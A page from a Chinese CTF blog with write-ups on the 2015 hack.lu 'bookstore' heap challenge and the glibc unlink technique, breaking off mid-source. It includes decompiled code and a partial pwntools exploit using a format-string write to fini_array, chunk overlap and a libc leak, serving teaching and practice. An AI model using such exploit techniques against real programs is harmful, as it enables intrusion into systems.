<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="CharonPt的Blog">
<meta property="og:url" content="https://github.com/CharonPt/CharonPt.github.io.git/page/3/index.html">
<meta property="og:site_name" content="CharonPt的Blog">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://github.com/CharonPt/CharonPt.github.io.git/page/3/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>CharonPt的Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">CharonPt的Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/05/10/2015-hacklu-bookstore/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/10/2015-hacklu-bookstore/" class="post-title-link" itemprop="url">2015-hacklu-bookstore</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-05-10 18:03:18" itemprop="dateCreated datePublished" datetime="2022-05-10T18:03:18+08:00">2022-05-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-05-11 00:51:22" itemprop="dateModified" datetime="2022-05-11T00:51:22+08:00">2022-05-11</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>回顾一下fini_array的内容，值得注意的是fini_array在RELRO半开的时候就不可写了，所以其只能利用在RELRO全关的情况下。因为一般题目都不会把RELRO全关的，所以看到一个全关的情况或许能往这方面想一下。</p>
<p>这题的难点主要在于控制格式化字符串的过程，要想到利用最后的向v5指向的chunk里复制内容的函数来控制格式化字符串，以及这个具体的步骤。其实回过来想每一步都感觉挺合理的，“因为某种方式必定走不通所以只能是那种方式”的这种思维。</p>
<p>unsorted bin不像fast bin，从unsorted bin中取出chunk时不会有所检查，所以可以选择先将某个chunk free到unsorted bin中，再去改它的size位，有时能比较省事</p>
<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>程序保护：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>main函数如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+4h] [rbp-BCh]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v5; <span class="comment">// [rsp+8h] [rbp-B8h]</span></span><br><span class="line">  <span class="keyword">void</span> *v6; <span class="comment">// [rsp+18h] [rbp-A8h]</span></span><br><span class="line">  <span class="keyword">void</span> *v7; <span class="comment">// [rsp+20h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">char</span> *dest; <span class="comment">// [rsp+28h] [rbp-98h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">136</span>]; <span class="comment">// [rsp+30h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v10; <span class="comment">// [rsp+B8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v6 = <span class="built_in">malloc</span>(<span class="number">0x80</span>uLL);</span><br><span class="line">  v7 = <span class="built_in">malloc</span>(<span class="number">0x80</span>uLL);</span><br><span class="line">  dest = <span class="built_in">malloc</span>(<span class="number">0x80</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !v6 || !v7 || !dest )</span><br><span class="line">  &#123;</span><br><span class="line">    fwrite(<span class="string">&quot;Something failed!\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0x12</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot; _____          _   _                 _          _                   _ \n&quot;</span></span><br><span class="line">    <span class="string">&quot;/__   \\_____  _| |_| |__   ___   ___ | | __  ___| |_ ___  _ __ ___  / \\\n&quot;</span></span><br><span class="line">    <span class="string">&quot;  / /\\/ _ \\ \\/ / __| &#x27;_ \\ / _ \\ / _ \\| |/ / / __| __/ _ \\| &#x27;__/ _ \\/  /\n&quot;</span></span><br><span class="line">    <span class="string">&quot; / / |  __/&gt;  &lt;| |_| |_) | (_) | (_) |   &lt;  \\__ \\ || (_) | | |  __/\\_/ \n&quot;</span></span><br><span class="line">    <span class="string">&quot; \\/   \\___/_/\\_\\\\__|_.__/ \\___/ \\___/|_|\\_\\ |___/\\__\\___/|_|  \\___\\/   \n&quot;</span></span><br><span class="line">    <span class="string">&quot;Crappiest and most expensive books for your college education!\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;We can order books for you in case they&#x27;re not in stock.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Max. two orders allowed!\n&quot;</span>);</span><br><span class="line">LABEL_14:</span><br><span class="line">  <span class="keyword">while</span> ( !v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1: Edit order 1&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2: Edit order 2&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3: Delete order 1&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4: Delete order 2&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;5: Submit&quot;</span>);</span><br><span class="line">    fgets(s, <span class="number">128</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( s[<span class="number">0</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Enter first order:&quot;</span>);</span><br><span class="line">        edit(v6);</span><br><span class="line">        <span class="built_in">strcpy</span>(dest, <span class="string">&quot;Your order is submitted!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Enter second order:&quot;</span>);</span><br><span class="line">        edit(v7);</span><br><span class="line">        <span class="built_in">strcpy</span>(dest, <span class="string">&quot;Your order is submitted!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">        <span class="keyword">delete</span>(v6);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>:</span><br><span class="line">        <span class="keyword">delete</span>(v7);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;5&#x27;</span>:</span><br><span class="line">        v5 = <span class="built_in">malloc</span>(<span class="number">0x140</span>uLL);</span><br><span class="line">        <span class="keyword">if</span> ( !v5 )</span><br><span class="line">        &#123;</span><br><span class="line">          fwrite(<span class="string">&quot;Something failed!\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0x12</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        sub_400937(v5, v6, v7);</span><br><span class="line">        v4 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, v5);</span><br><span class="line">  <span class="built_in">printf</span>(dest);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>edit函数如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">edit</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v2 != <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = fgetc(<span class="built_in">stdin</span>);</span><br><span class="line">    v1 = v3++;</span><br><span class="line">    *(v1 + a1) = v2;</span><br><span class="line">  &#125;</span><br><span class="line">  *(v3 - <span class="number">1LL</span> + a1) = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>delete函数如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">delete</span><span class="params">(<span class="keyword">void</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">free</span>(a1);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以及选择’5‘之后会调用的函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">sub_400937</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">const</span> <span class="keyword">char</span> *a2, <span class="keyword">const</span> <span class="keyword">char</span> *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(a1, <span class="string">&quot;Order 1: &quot;</span>);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(a2);</span><br><span class="line">  <span class="built_in">strncat</span>(a1, a2, v3);</span><br><span class="line">  <span class="built_in">strcat</span>(a1, <span class="string">&quot;\nOrder 2: &quot;</span>);</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(a3);</span><br><span class="line">  <span class="built_in">strncat</span>(a1, a3, v4);</span><br><span class="line">  *&amp;a1[<span class="built_in">strlen</span>(a1)] = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该函数的功能就是拷贝v6和v7所指向的chunk中的内容到v5所指向的chunk中，v5最后用于输出。</p>
<p>程序的逻辑很简单，先按顺序申请出chunk1、chunk2（v6、v7所对应的chunk）以及dest三个块，大小都为0x90。并且可以任意编辑chunk1跟chunk2中的内容。</p>
<p>总的来说本题的三个漏洞点为：① edit函数中的任意长度堆溢出。② delete中的uaf。③ main函数末尾的格式化字符串。</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>首先我们可以确定的一点是程序中可以用来泄漏的一个点只有格式化字符串，但是因为格式化字符串之后main函数就返回了，所以我们肯定还得用某种方式让程序再返回到我们希望的地方，那么这里我们一般就会想到修改fini_array0为main_addr来实现，由于没开启PIE，所以这个思路是可行的。</p>
<h4 id="一、格式化字符串的构造"><a href="#一、格式化字符串的构造" class="headerlink" title="一、格式化字符串的构造"></a>一、格式化字符串的构造</h4><p>那么我们第一步就是思考怎么构造这个格式化字符串，因为其参数是dest，而且我们每次edit完之后都会调用strcpy来往dest中写入字符串，而strcpy函数会在最后补一个结束符，所以就算我们能利用堆溢出修改dest中的内容也没用，最后会被截断。</p>
<p>那么显然我们就只能靠<code>sub_400937()</code>函数了，因为在这个函数里其会将chunk1和chunk2的内容拷贝到v5对应的数组中，而v5对应的chunk是在我们选择了’5’之后再申请的，也就是说我们可以让v5跟dest堆重叠来控制dest中的内容。</p>
<p>但是dest不能直接被free掉，所以只能让v5跟chunk2重叠，然后覆盖掉dest。</p>
<p>这里既然要让v5跟chunk2重叠，那么就要通过chunk1去改掉chunk2的size，但是因为改掉size之后free掉这个chunk时还要过glibc的检测，所以很麻烦，所以我们可以选择<strong>先把chunk2 free掉，再把它的size盖掉</strong>，这样就减少了要伪造的数据，而且其从unsorted bin中被取出的时候也不会对这个chunk有所检查。</p>
<p>接下来我们就要在chunk1里面构造格式化字符串，同时要有一段padding保证在chunk1跟chunk2复制完到v5之后，格式化字符串的本体出现在dest中。</p>
<p>这一部分要描述太麻烦了，但是其实并不是很难，稍微计算下padding即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">fini_array = <span class="number">0x6011B8</span></span><br><span class="line">main = <span class="number">0x400A39</span></span><br><span class="line"></span><br><span class="line">free2()</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">9</span> + <span class="string">&#x27;%63c%15$hn%2553c%14$hn&#x27;</span> + <span class="string">&#x27;%31$p&#x27;</span>	<span class="comment">#chunk1 start</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x6c</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">edit1(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(<span class="number">0x151</span>))</span><br><span class="line">edit1(payload)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload = <span class="string">&#x27;5&#x27;</span> + <span class="string">&#x27;c&#x27;</span>*<span class="number">15</span> + p64(fini_array) + p64(fini_array+<span class="number">2</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">system = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>) - (<span class="number">0x7ffff7a2d840</span> - <span class="number">0x7ffff7a523a0</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;system = &quot;</span>,<span class="built_in">hex</span>(system)</span><br></pre></td></tr></table></figure>

<p>到这里为止我们完成了libc的泄漏并返回到main函数</p>
<h4 id="二、劫持"><a href="#二、劫持" class="headerlink" title="二、劫持"></a>二、劫持</h4><p>到这里这题其实就没有难点了，感觉还是用格式化字符串简单点，所以我在前面那步多泄漏了个栈地址，然后返回地址改one_gadget就行了，这一部分很简单就不贴exp了。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/05/07/Unlink/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/07/Unlink/" class="post-title-link" itemprop="url">Unlink</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-05-07 17:29:42" itemprop="dateCreated datePublished" datetime="2022-05-07T17:29:42+08:00">2022-05-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-05-21 16:36:39" itemprop="dateModified" datetime="2022-05-21T16:36:39+08:00">2022-05-21</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这里先说总结，详细的下面说</p>
<p>总的下来，要利用unlink必须满足三个条件：</p>
<ol>
<li><code>&amp;P</code>的地址已知（保存堆指针的地址）</li>
<li><code>&amp;P-0x18</code>到<code>&amp;P</code>这段空间可写</li>
<li>至少得有一个off-by-one来修改要free掉的chunk的size位。</li>
</ol>
<p>目前感觉就这三个条件，但是例题在2.27下复现失败了，暂时还不知道为啥</p>
<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>Unlink对应解链的意思，其在libc里是一个宏定义，作用是将一个chunk从双向链表中取出，而且其还会检测与取出的这个chunk的物理相邻的位置是否还有free chunk，如果有则会触发向前合并（跟物理低地址的chunk合并）/向后合并（跟物理高地址的chunk合并）</p>
<p>结合unlink源码的一部分来看</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            </span></span><br><span class="line">    <span class="comment">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      </span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);               </span><br><span class="line">    FD = P-&gt;fd;                                                                      </span><br><span class="line">    BK = P-&gt;bk;                                                                      </span><br><span class="line">    <span class="comment">// 防止攻击者简单篡改空闲的 chunk 的 fd 与 bk 来实现任意写的效果。</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      </span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br><span class="line">    <span class="keyword">else</span> &#123;                                                                      </span><br><span class="line">        FD-&gt;bk = BK;                                                             </span><br><span class="line">        BK-&gt;fd = FD;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>

<h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p>下面是glibc-2.30的一部分源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    <span class="comment">//如果inuse位为0，则让p指针指向前一个chunk，进行后续的unlink操作</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">      <span class="comment">//如果前一个chunk的size不等于刚刚的prev_size则报错</span></span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来是unlink_chunk函数（似乎在新版里unlink变成一个函数了）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list.  */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">unlink_chunk</span> <span class="params">(mstate av, mchunkptr p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. 